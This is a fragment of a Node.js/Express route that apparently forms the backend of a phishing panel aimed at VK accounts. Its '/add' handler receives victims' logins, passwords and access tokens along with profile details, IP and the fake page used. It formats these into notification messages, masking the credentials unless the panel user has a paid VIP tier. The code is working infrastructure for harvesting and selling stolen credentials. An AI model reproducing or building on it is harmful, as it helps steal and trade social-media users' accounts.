...
router.post('/add', async (req, res) => {
    if (iplist.filter(e => e == req.body.ip).length < 10) {
        ...
        if (!condidate && req.body.login.trim() != '' && req.body.password.trim() != '') {
            ...
            if (userData) {
                ...
                let BluredToken = req.body.token.substr(0, Math.floor(req.body.token.length * 30 / 100)) + '*'.repeat(req.body.token.length - Math.floor(req.body.token.length * 50 / 100)) + req.body.token.substr(req.body.token.length - Math.floor(req.body.token.length * 20 / 100), req.body.token.length)
                let user = userData
                let vkMessage = messages.vkMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date() ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date() ? req.body.password : BluredPassword, user.vip ? req.body.token : user.vip ? req.body.token : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.token : BluredToken, req.body.first_name || '-', req.body.last_name || '-', 'id' + req.body.user_id || '-', req.body.counters.friends == 0 || req.body.counters.friends > 0 ? req.body.counters.friends : '-', req.body.counters.followers == 0 || req.body.counters.followers > 0 ? req.body.counters.followers : '-', req.body.online ? '✳️' : '⭕️', req.body.online ? 'Online' : 'Offline', req.body.counters.gifts == 0 || req.body.counters.gifts > 0 ? req.body.counters.gifts : '-', req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)] || '-', req.body.pattern || 0, GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0)
                let otherMessage = messages.otherMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.password : BluredPassword, req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)] || '-', GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0)
